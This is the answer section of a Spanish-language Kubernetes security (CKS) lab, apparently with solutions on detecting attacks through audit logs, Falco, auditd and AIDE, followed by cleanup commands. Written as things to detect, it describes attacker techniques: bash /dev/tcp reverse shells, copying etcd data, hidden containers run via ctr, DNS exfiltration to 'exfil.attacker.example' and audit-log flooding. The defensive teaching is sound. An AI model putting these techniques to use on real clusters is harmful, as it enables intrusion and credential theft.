**R3.5 —** (a) **Actividad a nivel de kernel que no transita el límite de syscalls** — cargar un rootkit LKM que engancha o se esconde de los tracepoints a los que Falco se adhiere, o programas eBPF que manipulan lo que el sensor observa. Cubierto por la regla `kernel_modules` de `auditd` (`init_module`/`finit_module`) del Ejercicio 2, más Secure Boot / firma de módulos. (b) **Modificaciones de archivos hechas antes de que el sensor arrancara, o a través de rutas alternativas de envío de I/O** como `io_uring`, que agrupa operaciones a través de un búfer circular compartido en lugar de una syscall por operación. Cubierto por la comparación de línea base de AIDE, que detecta el *resultado* en vez del acto. La lección: los sensores de syscalls detectan comportamiento, las herramientas de integridad detectan estado, y necesitás ambos porque el punto ciego de cada uno es la especialidad del otro.

**R3.6 —** Es el UID **dentro del user namespace del contenedor tal como lo ve el kernel** — para un contenedor sin remapeo de user namespace, el UID 0 del contenedor *es* el UID 0 del nodo, así que el proceso genuinamente tiene credenciales de root sobre el kernel del host y solo los namespaces y las capabilities lo restringen. `user.name=root` es la resolución que hace Falco del UID 0 contra el `/etc/passwd` del *host*, no el del contenedor, así que el *nombre* puede ser engañoso mientras el *número* es autoritativo. Al hacer triage: confiá en `user.uid`, verificá si el Pod era privilegiado o tenía `hostPID`/`hostNetwork`, y tratá `uid=0` en un contenedor como a un límite de namespace de distancia del root del nodo, no como un root seguramente aislado.

---

### Ejercicio 4 — Log de auditoría

**R4.1 —** `requestObject` se puebla en el nivel **`Request`** y superiores; `responseObject` solo en **`RequestResponse`**. En `Metadata` obtenés el quién (`user`, `sourceIPs`, `userAgent`), el qué (`verb`, `objectRef` con recurso/namespace/nombre), el cuándo (`requestReceivedTimestamp`, `stageTimestamp`) y el resultado (`responseStatus.code`) — pero ningún cuerpo de petición, así que no podés ver `securityContext.privileged`, la imagen del contenedor, los montajes hostPath, ni el `roleRef` de un binding. Cualquier detección que razone sobre el *contenido* de una mutación requiere `Request`; por eso exactamente la política eleva la creación de Pods y cargas de trabajo a `Request` mientras deja las lecturas en `Metadata`.

**R4.2 —** Resignás la prueba de **qué valores de Secret fueron efectivamente devueltos al cliente** — con `Metadata` sabés que `app-sa` hizo un `get` sobre el Secret `payments-db` y obtuvo un 200, pero no los bytes que recibió. En la práctica eso alcanza: para respuesta a incidentes asumís que cada Secret que la identidad leyó con éxito está comprometido y los rotás todos. `RequestResponse` sobre Secrets es la decisión equivocada porque escribe **cada valor de Secret en texto plano dentro del log de auditoría** — un archivo en el disco del control plane, enviado a un agregador de logs, replicado a backups e indexado por búsqueda. Convertirías tu sistema de detección en el almacén de credenciales de mayor valor del entorno, legible por cualquiera con acceso a los logs. El mismo razonamiento aplica a `configmaps`, que rutinariamente contienen credenciales que deberían haber sido Secrets.

**R4.3 —** `RequestReceived` se emite en el instante en que el API server recibe la petición, *antes* de autenticación, autorización, admisión o ejecución. Es el gemelo de `ResponseComplete` y aproximadamente duplica el volumen del log a cambio de casi nada de información adicional — el evento del lado de la respuesta lleva todo eso más el resultado. El único caso donde importa: una petición que **nunca se completa** — el API server crashea, es matado, o se cuelga a mitad de la petición — deja solo un evento `RequestReceived`. Si estás investigando un API server que murió bajo ataque, o cazando peticiones diseñadas deliberadamente para hacerlo crashear, ese evento huérfano es el único rastro de que la petición existió.

**R4.4 —** Un **401** significa que la autenticación misma falló: no se presentó una credencial válida, así que el API server nunca resolvió una identidad y RBAC nunca fue consultado. Un **403** significa que la autenticación *tuvo éxito* y la autorización después denegó la petición — el servidor sabía quién era el llamador y dijo que no. Ver `system:anonymous` con un `403` prueba por lo tanto que **la autenticación anónima está habilitada** (`--anonymous-auth=true`): las peticiones no autenticadas están siendo vinculadas exitosamente a la identidad incorporada `system:anonymous` y evaluadas por RBAC. Con `--anonymous-auth=false` la misma sonda devuelve 401 sin usuario resuelto. Operativamente: una ráfaga de 403 desde una identidad es reconocimiento hecho por una credencial *válida* — alguien mapeando sus permisos; una ráfaga de 401 es adivinación de credenciales o un token expirado/rotado.

**R4.5 —** Un 403 solo muestra un intento que falló, y los controladores legítimos generan 403 constantemente por sondeos normales y patrones de acceso optimista — baja señal, alto volumen. El User-Agent caracteriza el **herramental**, y el herramental de una carga de trabajo es determinista: una aplicación Go usando `client-go` envía algo como `payments/v2.1 (linux/amd64) kubernetes/$Format` o el default de client-go `kubernetes/v1.34.0 (linux/amd64) kubernetes/ab12cd3`. `python-requests/2.32.3` o `curl/8.5.0` desde una ServiceAccount que solo habló client-go es *herramental manejado a mano usando credenciales robadas*, y es una señal sobre peticiones **exitosas**, no solo sobre las fallidas. Construí una línea base de User-Agent por ServiceAccount; la alerta ante la primera desviación es una de las detecciones de mayor precisión disponibles en el log de auditoría. (Es trivialmente falsificable, así que tratala como de alta precisión, no de alta cobertura.)

**R4.6 —** **Inundación de la rotación de logs.** El atacante nunca toca el archivo de log; simplemente genera suficiente tráfico de API autorizado — un bucle apretado de `list pods`, una tormenta de watches — para escribir más de 100 MiB × 10 = ~1 GiB de registros de auditoría, lo que hace rodar su actividad anterior fuera de los backups retenidos y fuera del disco por completo. Los límites de retención que configuraste por seguridad de disco se vuelven una primitiva de destrucción de evidencia. La solución es arquitectónica, no un cambio de ajuste: **enviar los eventos de auditoría fuera del nodo en tiempo real** vía `--audit-webhook-config-file` (o un sidecar/agente que siga el archivo) hacia almacenamiento de solo-anexado, escritura-única, que las credenciales del nodo no puedan borrar. Y además alertá sobre la inundación misma — un pico repentino en la tasa de eventos de auditoría desde una identidad es una detección, no solo una anomalía operativa.

---

### Ejercicio 5 — Datos

**R5.1 —** El cifrado en reposo detiene al atacante que obtiene los **archivos de datos de etcd o un snapshot sin la clave de cifrado del API server** — un backup robado, un disco dado de baja, un bucket de backup comprometido, un snapshot restaurado en otro entorno. **No** detiene al atacante del paso 2 si además tiene la clave de cifrado, y más importante aún, no detiene a *ningún* atacante que pueda alcanzar el API server con RBAC suficiente, porque el API server descifra transparentemente en la lectura: `kubectl get secret -o yaml` devuelve texto plano de todas formas. Tampoco hace nada contra un nodo comprometido, donde el kubelet ya materializó el Secret en el sistema de archivos del contenedor. El cifrado en reposo acota un camino de exfiltración específico; no es un control de acceso a Secrets, y el log de auditoría sigue siendo la detección para los caminos que no cubre.

**R5.2 —** El log de auditoría no muestra **nada**. Un token proyectado de ServiceAccount o un volumen de Secret montado es materializado por el **kubelet** en un `tmpfs` dentro del Pod; cada lectura posterior del contenedor es un `openat`/`read` ordinario contra almacenamiento local respaldado en memoria, sin ninguna intervención del API server. El único sensor que cubre esto es un **sensor de syscalls** — precisamente la regla de Falco `ServiceAccount Token Read By Interactive Process` del Ejercicio 3, que hace match con `fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount`. Esta es la intuición estructural más importante de la capa de datos: el log de auditoría de la API cubre el acceso a Secrets *a través de la API*, y el monitoreo de syscalls cubre el acceso a Secrets *a través del sistema de archivos*. Desplegá solo uno y cubriste la mitad de los caminos.

**R5.3 —** Un token de ServiceAccount es un token portador (bearer) — no lleva ninguna vinculación a una ubicación — así que la identidad en el log de auditoría te dice *qué* SA se usó pero nada sobre *quién* la usó. `sourceIPs[0]` es el único campo que responde "¿desde dónde?", y cuando es igual a la IP del Pod donde la SA corre legítimamente, la petición es consistente; cuando las peticiones de la misma SA de repente se originan desde una IP de Pod distinta, una IP de nodo, o una dirección externa, el token dejó su Pod. Lo que destruye esto: **cualquier salto que reescriba la dirección de origen** — un gateway de egress de un service mesh, un límite de NAT, un API server detrás de un balanceador de carga en la nube o un proxy inverso que no preserva la dirección del cliente. En esas topologías cada petición parece venir de un puñado de IPs de infraestructura y el pivote no vale nada, lo cual es uno de los argumentos más fuertes para **tokens proyectados vinculados y de corta vida con un `audience`** y para la expiración vía `TokenRequest` en lugar de los antiguos tokens basados en Secret sin expiración: si la atribución por dirección no está disponible, achicá la ventana en la que un token robado es útil. (Notá que `sourceIPs` es un arreglo — con una configuración de proxy confiable la cadena se preserva, y `sourceIPs[0]` es el cliente originante.)

**R5.4 —** (a) **Copiar los archivos de datos crudos.** `cp -a /var/lib/etcd /tmp/x` o hacer `tar` del directorio — un archivo de base de datos `bbolt` es una copia completa y portable del estado del clúster. Atrapado por `Etcd Data Directory Accessed By Non-Etcd Process` (Falco) y por la vigilancia de `auditd` `-w /var/lib/etcd/ -p rwa -k etcd_data` del Ejercicio 2. (b) **Consultar la API de etcd directamente con los certificados de cliente robados**, usando cualquier cliente de etcd en vez del binario `etcdctl` — un programita en Go, o `curl` contra el gateway gRPC. La regla `Etcd Snapshot Taken` que hace match con `proc.name in (etcdctl, etcdutl)` no ve esto en absoluto; lo que igual lo atrapa es la vigilancia `-w /etc/kubernetes/pki/ -p rwa -k k8s_pki`, porque cualquier cliente así tiene primero que **leer la clave de cliente**, más la regla del directorio de datos de etcd si toman la vía del archivo. La lección general: las reglas clavadas en **nombres de procesos** son evadibles renombrando o reimplementando; las reglas clavadas en **los recursos que el ataque debe tocar** — el archivo de clave, el directorio de datos — no lo son.

---

### Ejercicio 6 — Red

**R6.1 —** Porque el DNS es el único camino de egress que casi siempre está permitido, por necesidad: toda carga de trabajo Kubernetes debe resolver nombres de Service, así que una política de denegación por defecto de egress que si no sería hermética igual necesita la excepción `allow-dns` que escribiste. Los atacantes lo saben, y por eso el DNS lleva beaconing de C2 y exfiltración de datos cuando nada más logra salir. Y el DNS es excepcionalmente rico en señal: las consultas son cortas, basadas en texto, nombran el destino explícitamente, y se registran centralizadamente en CoreDNS sin importar el CNI, así que un solo cambio de configuración te da cobertura para todo el clúster. La tunelización tiene una firma estadística estridente — decenas a miles de subdominios únicos bajo un mismo padre, etiquetas inusualmente largas, distribuciones de caracteres base32/base64, alta proporción de consultas `TXT`/`NULL`, timing constante de consultas. Notá también lo que `allow-dns` **no** restringe: permite consultas por *cualquier* nombre, incluido `exfil.attacker.example`. Restringir los nombres mismos requiere una política consciente de L7 (`toFQDNs` de Cilium) o una política de reenvío/lista de bloqueo en CoreDNS.

**R6.2 —** Un descarte te dice dos cosas distintas, y solo una de ellas es sobre la red. El paquete fue bloqueado, sí — pero una carga de trabajo que intenta una conexión que nunca necesitó legítimamente es evidencia de que **el comportamiento de la carga de trabajo cambió**, lo que suele significar que fue comprometida. La política detuvo la exfiltración; no hizo nada respecto del RCE que causó el intento, el atacante todavía tiene ejecución de código en ese Pod, y ahora va a probar un camino que *sí* esté permitido. La prevención y la detección responden preguntas distintas: la prevención pregunta "¿esto tuvo éxito?", la detección pregunta "¿qué me dice esto sobre el estado de mi sistema?". Los flujos descartados desde un namespace con denegación por defecto son una de las detecciones más limpias y de menor tasa de falsos positivos disponibles, precisamente *porque* la política vuelve explícito el tráfico normal — todo lo demás es por definición anómalo.

**R6.3 —** (a) **Un CNI con observabilidad de flujos incorporada**: Cilium/Hubble registra un veredicto para cada flujo (`hubble observe --verdict DROPPED`), y Calico ofrece `action: Log` en `GlobalNetworkPolicy`, emitiendo al log del kernel vía iptables NFLOG. Dependencia: quedás atado a ese CNI específico y a su versión, y Hubble agrega un plano de control (Hubble Relay, retención, almacenamiento) que hay que operar y asegurar. (b) **Captura de paquetes o conexiones a nivel de nodo** — `tcpdump`/`conntrack` dentro del network namespace del Pod vía `nsenter`, o un sensor eBPF como las macros `inbound`/`outbound` de Falco o Tetragon. Dependencia: ves paquetes y sockets pero **no el veredicto de la política** — no podés distinguir "descartado por NetworkPolicy" de "conexión rechazada" o "ruta inalcanzable" sin inferirlo, y capturar todo en un nodo ocupado es caro. Ninguna es gratis, y Kubernetes central no te da ninguna por defecto, y por eso la capa de red es la más comúnmente no monitoreada de la lista.

**R6.4 —** Porque la regla hace match sobre la **syscall `dup`/`dup2`/`dup3`** — el acto de duplicar un descriptor de archivo de red sobre los descriptores 0, 1 o 2 — no sobre qué binario corrió. El `/dev/tcp/host/port` de `bash` es un builtin del shell: bash abre el socket él mismo y nunca hace `execve` de `nc`, `socat` ni de nada, así que una regla sobre `proc.name in (nc, ncat, socat)` no ve nada. Pero *todo* reverse shell, sin importar el lenguaje de implementación o el binario, tiene que en última instancia conectar su E/S estándar a un socket para que el extremo remoto pueda manejarlo — y en Linux eso significa `dup2(sockfd, 0/1/2)`. Esta es la diferencia entre una regla **basada en indicadores** (un nombre, un hash, una IP — evadible cambiando ese único atributo) y una regla **basada en comportamiento** (un paso requerido de la técnica — evadible solo encontrando otra técnica). Las reglas de comportamiento son el punto central de la detección a nivel de syscalls; cuando escribís una regla de Falco, preguntate siempre qué *debe* hacer el atacante en vez de qué *típicamente* hace.

---

### Ejercicio 7 — Cargas de trabajo

**R7.1 —** containerd particiona su estado en **namespaces** (`ctr namespaces list`). El kubelet le habla a containerd por el CRI, que está cableado al namespace `k8s.io`, así que `crictl ps` — que es un cliente CRI — solo puede ver contenedores en `k8s.io`. Un contenedor creado con `ctr -n default run ...` vive en un namespace de containerd distinto y es invisible para `crictl`, para el kubelet, y por lo tanto para toda la API de Kubernetes. Nada del plano de control de Kubernetes se le aplica: los controladores de admisión solo corren sobre peticiones de la API y este contenedor nunca fue una petición de la API; Pod Security Admission evalúa specs de Pod y no hay objeto Pod; NetworkPolicy selecciona Pods por etiqueta y no hay Pod para seleccionar; las cuotas de recursos, las PriorityClasses, los webhooks de política de imágenes y el scheduler quedan todos igualmente evadidos. Es un contenedor Linux liso y llano con acceso total al nodo, y tus únicos caminos de detección son a nivel de nodo: enumeración con `ctr` en todos los namespaces, comparación de cgroups contra `kubepods.slice`, inspección del árbol de procesos, y monitoreo de syscalls. Este es el movimiento estándar de post-explotación después de cualquier escape de contenedor o compromiso de nodo, y es la razón por la que `crictl ps` por sí solo es una respuesta inadecuada a "¿qué está corriendo en este nodo?".

**R7.2 —** Cuando el kubelet arranca un Pod desde un manifiesto en `--pod-manifest-path` (un **Pod estático**), crea un objeto **mirror Pod** de solo lectura en la API para que el Pod sea visible con `kubectl`. Las `ownerReferences` del mirror Pod apuntan al **Node**, no a un ReplicaSet, DaemonSet o Job — esa es la huella por la que filtraste, y es por eso que una puerta trasera vía Pod estático no es realmente invisible: `kube-apiserver`, `kube-scheduler`, `kube-controller-manager` y `etcd` están legítimamente en esta categoría, así que cualquier *otra cosa* con dueño Node vale la pena investigarla. Para derrotar exactamente esa verificación, un atacante se saltea al kubelet por completo y arranca su contenedor directamente por el runtime (`ctr -n default run`, como en la P7.1) — sin archivo de manifiesto, así que no hay evento `k8s_static_pod` de `auditd` ni delta de AIDE; sin intervención del kubelet, así que no hay mirror Pod ni registro en la API. Sus exposiciones restantes son la inspección de cgroups/procesos y el sensor de syscalls. La detección en capas no es redundancia; cada capa cubre la evasión de la capa de arriba.

**R7.3 —** `hostPID: true` pone al contenedor en el **PID namespace del host**, así que puede ver y señalizar cada proceso del nodo — incluidos tus sensores. Concretamente, el atacante puede hacer `kill` al proceso Falco o a su servicio `falco-modern-bpf`, hacer `kill` a `auditd`, leer `/proc/<pid>/` de cualquier proceso para robar credenciales y variables de entorno de memoria (el kubeconfig del kubelet, rutas de la clave de cliente de etcd, tokens de otras cargas de trabajo), y usar `/proc/1/root` para alcanzar el sistema de archivos del host sin necesitar siquiera un montaje `hostPath`. Convierte un compromiso de la capa de cargas de trabajo en control directo sobre el stack de detección del nodo — el atacante puede ir primero por el punto ciego. Por eso `hostPID: true` fuera de un conjunto pequeño y explícitamente aprobado de DaemonSets de sistema debe tratarse como un hallazgo crítico por derecho propio, por eso un watchdog de sensores que alerte ante la *ausencia* de sensores es obligatorio, y por eso "no hay alertas" nunca es por sí solo evidencia de "no hubo ataque".

**R7.4 —** No. Borrar el manifiesto elimina el *mecanismo que encontraste*; no dice nada sobre lo que el atacante hizo mientras corría, ni sobre qué más dejó. Antes de declarar limpio el nodo tenés que verificar: (1) si el Pod corrió como privilegiado con `/` montado — asumí compromiso total del nodo y tratá cada credencial del nodo como robada, incluidos el kubeconfig del kubelet, cada token de ServiceAccount montado, y cualquier material de PKI; (2) persistencia por SSH — `/root/.ssh/authorized_keys` y el de cada usuario, más los drop-ins de configuración de `sshd`; (3) otra persistencia — unidades y timers de systemd, `/etc/cron*`, `/etc/rc.local`, perfiles de shell, `LD_PRELOAD` en `/etc/ld.so.preload`; (4) contenedores fuera del namespace del CRI (P7.1) y cualquier módulo de kernel cargado (`lsmod`, la clave de auditoría `kernel_modules`); (5) una verificación completa de AIDE contra una base de datos **conocida como buena y fuera del nodo**; (6) el log de auditoría de la API para ver qué hicieron las credenciales robadas *a nivel de todo el clúster* — un compromiso de nodo con un token privilegiado es un compromiso de clúster hasta que se demuestre lo contrario; (7) si el atacante rehízo la línea base de AIDE o vació las reglas de auditoría. En la práctica, la acción defendible para un nodo que creés comprometido con root es hacer cordon, drain, **reconstruirlo desde una imagen conocida como buena**, y rotar cada credencial que residía en él. No se puede limpiar un host con las herramientas que ese host está corriendo.

---

### Ejercicio 8 — Capstone

**R8.1 —** `sourceIPs` registra el par de red tal como lo observó el API server, que es el último salto, no la persona ni la carga de trabajo. Como un token portador puede reproducirse desde cualquier lado, un atacante que exfiltra un token y lo usa desde un jump host, desde el nodo del control plane, desde su laptop a través de un túnel, o desde detrás de un NAT va a presentar la dirección que ese camino produzca. Tratá `sourceIPs` como evidencia **corroborante** — poderosa cuando *contradice* la ubicación esperada ("la SA de este Pod está llamando desde una dirección que no es este Pod") y débil como atribución positiva. Lo que sigue siendo confiable es el `user.username`/`user.uid`/`user.groups` verificado criptográficamente: el API server probó que el llamador poseía esa credencial. Así que la atribución responde "qué credencial", no "qué persona o proceso" — que es precisamente por qué importan los tokens de corta vida vinculados a una audiencia, las ServiceAccounts por carga de trabajo, y la línea base de User-Agent de la R4.5: achican la ambigüedad que `sourceIPs` no puede resolver.

**R8.2 —** El log de auditoría de la API cubre exactamente las acciones que **transitan el API server**, y se detiene en el momento en que el atacante obtiene ejecución *dentro* de algo que el API server ya concedió. Crear el Pod privilegiado fue una petición de la API, así que quedó registrado íntegramente. Todo lo que el atacante hizo después con ese Pod — escribir en `/host/root/.ssh/authorized_keys`, leer el sistema de archivos del nodo, inspeccionar el `/proc` de otros contenedores, arrancar un contenedor fuera del namespace del CRI, conectarse hacia afuera — ocurrió enteramente en el nodo y nunca tocó el API server. Esto te da la regla: **el log de auditoría de la API es un registro perfecto de las peticiones del atacante y un punto ciego para sus consecuencias.** Responde "¿cómo obtuvieron la capacidad?" y nunca "¿qué hicieron con ella?". El evento de creación del Pod es por lo tanto el *pivote*: en el instante en que ves un Pod privilegiado / con `hostPID` / con `hostPath: /` creado por una identidad inesperada, tenés que cambiar a fuentes a nivel de nodo — `auditd`, Falco, AIDE, `ctr` — porque la API no te va a decir nada más. Alertar sobre el evento de creación vale más que alertar sobre cualquier cosa aguas abajo, ya que es el último momento en que el sensor barato y centralizado todavía puede ver al atacante.

**R8.3 —** *A favor de arreglarlo:* el descubrimiento es una fase genuina del ataque (T1613), es el punto más temprano de la cadena donde podrías actuar, y una regla de Falco para lecturas de `/proc/self/environ`, `/etc/resolv.conf` o las variables `KUBERNETES_SERVICE_HOST` dentro de un contenedor es trivial de escribir. *En contra:* esas lecturas exactas son lo que hace cada aplicación al arrancar — descubrimiento de servicios, configuración de DNS, inicialización del SDK — así que la regla se dispara continuamente en cada Pod del clúster con una tasa de falsos positivos que va a hacer que silencien todas las alertas de Falco en una semana, lo que te cuesta las detecciones CRITICAL que sí funcionaban. **Decisión de ingeniería:** no alertar sobre esto. Registralo, y usalo solo como *contexto de correlación* — las lecturas de descubrimiento se vuelven interesantes cuando aparecen segundos después de un evento `pods/exec` o de una lectura de token de SA, nunca por sí solas. Una detección cuyo volumen hace que quienes responden dejen de leer el canal tiene valor negativo; el hogar correcto para señales de baja precisión y alta cobertura es el enriquecimiento y la caza retrospectiva, no el paging. La precisión en el nivel de alertado es un recurso que gastás, y deberías gastarlo en los pasos 3, 5, 6 y 7, donde la tasa base de actividad benigna es casi cero.

**R8.4 —** (a) **Recolección centralizada, sincronizada en el tiempo y a prueba de manipulación.** Cada sensor envía a un único destino de solo-anexado del que los nodos comprometidos no pueden borrar — auditoría de la API vía `--audit-webhook-config-file`, Falco vía falcosidekick/`http_output`, `auditd` vía `audisp-remote`, informes de AIDE empujados hacia afuera — con NTP forzado en cada nodo para que las marcas de tiempo sean comparables al segundo. Sin esto, correlacionar cinco fuentes en tres hosts significa entrar por SSH a hosts que el atacante puede controlar, leer logs que puede haber truncado, y reconciliar relojes que se desfasan; y las técnicas de destrucción de evidencia de la R1.3, la R2.4 y la R4.6 siguen funcionando todas. (b) **Una clave común de identidad/correlación entre fuentes.** Falco emite `k8s.ns.name`/`k8s.pod.name`/`container.id`, el log de auditoría emite `objectRef.namespace`/`objectRef.name`/`user.username`, y `auditd` emite `auid`/`pid`/`comm` — nada los une automáticamente. Normalizar a campos compartidos (UID del Pod, ID del contenedor, nombre del nodo, ServiceAccount) en la ingesta es lo que convierte siete alertas desconectadas en un incidente. Ninguno de los dos cambios es "instalar más reglas" porque tu cobertura de reglas en este laboratorio ya era suficiente — cada fase excepto el paso de descubrimiento deliberadamente excluido produjo evidencia. Lo que falló fue la **supervivencia de la evidencia y la unibilidad de la evidencia**. La madurez de la ingeniería de detección se mide por qué tan rápido podés responder "¿qué pasó?", no por cuántas reglas tenés cargadas; agregar reglas a un sistema sin recolección confiable y sin clave de correlación solo agrega más lugares donde mirar a mano mientras el atacante todavía tiene el disco donde está tu evidencia.

</details>

---

## Limpieza

```bash
kubectl delete ns prod sre-debug --ignore-not-found
kubectl delete clusterrolebinding rogue-admin --ignore-not-found
kubectl -n kube-system apply -f /tmp/coredns.bak.yaml && kubectl -n kube-system rollout restart deploy coredns

ssh cks-w1 'sudo rm -f /etc/falco/rules.d/cks-6.2-*.yaml; sudo systemctl restart falco-modern-bpf'
ssh cks-cp 'sudo rm -f /etc/kubernetes/manifests/kube-sysmon.yaml; sudo sed -i "/Probe/d" /root/.ssh/authorized_keys'
# Keep /etc/audit/rules.d/70-cks-threats.rules and the audit policy - they are the deliverable.
```

Para revertir el API server, restaurá `/root/kube-apiserver.yaml.bak` **hacia** `/etc/kubernetes/manifests/` con `sudo cp`, nunca editando en el lugar con una herramienta que deje archivos de swap ahí.

---

## Fuentes

- CNCF, *Certified Kubernetes Security Specialist (CKS) Curriculum v1.34* — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- Kubernetes, *Auditing* — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Kubernetes, *Audit Configuration API (audit.k8s.io/v1)* — https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
- Kubernetes, *kube-apiserver command-line reference* — https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/
- Kubernetes, *Kubelet authentication/authorization* — https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/
- Kubernetes, *Encrypting Confidential Data at Rest* — https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/
- Kubernetes, *Static Pods* — https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
- Falco, *Documentation* — https://falco.org/docs/
- Falco, *falcosecurity/rules* (conjunto de reglas y macros por defecto) — https://github.com/falcosecurity/rules
- Falco, *k8saudit plugin* — https://github.com/falcosecurity/plugins/tree/main/plugins/k8saudit
- Linux man-pages, *auditctl(8)* — https://man7.org/linux/man-pages/man8/auditctl.8.html
- Linux man-pages, *ausearch(8)* — https://man7.org/linux/man-pages/man8/ausearch.8.html
- AIDE, *Advanced Intrusion Detection Environment* — https://aide.github.io/
- Cilium, *Hubble observability* — https://docs.cilium.io/en/stable/observability/hubble/
- CoreDNS, *log plugin* — https://coredns.io/plugins/log/
- MITRE ATT&CK, *Containers Matrix* — https://attack.mitre.org/matrices/enterprise/containers/
- CIS, *Kubernetes Benchmark* — https://www.cisecurity.org/benchmark/kubernetes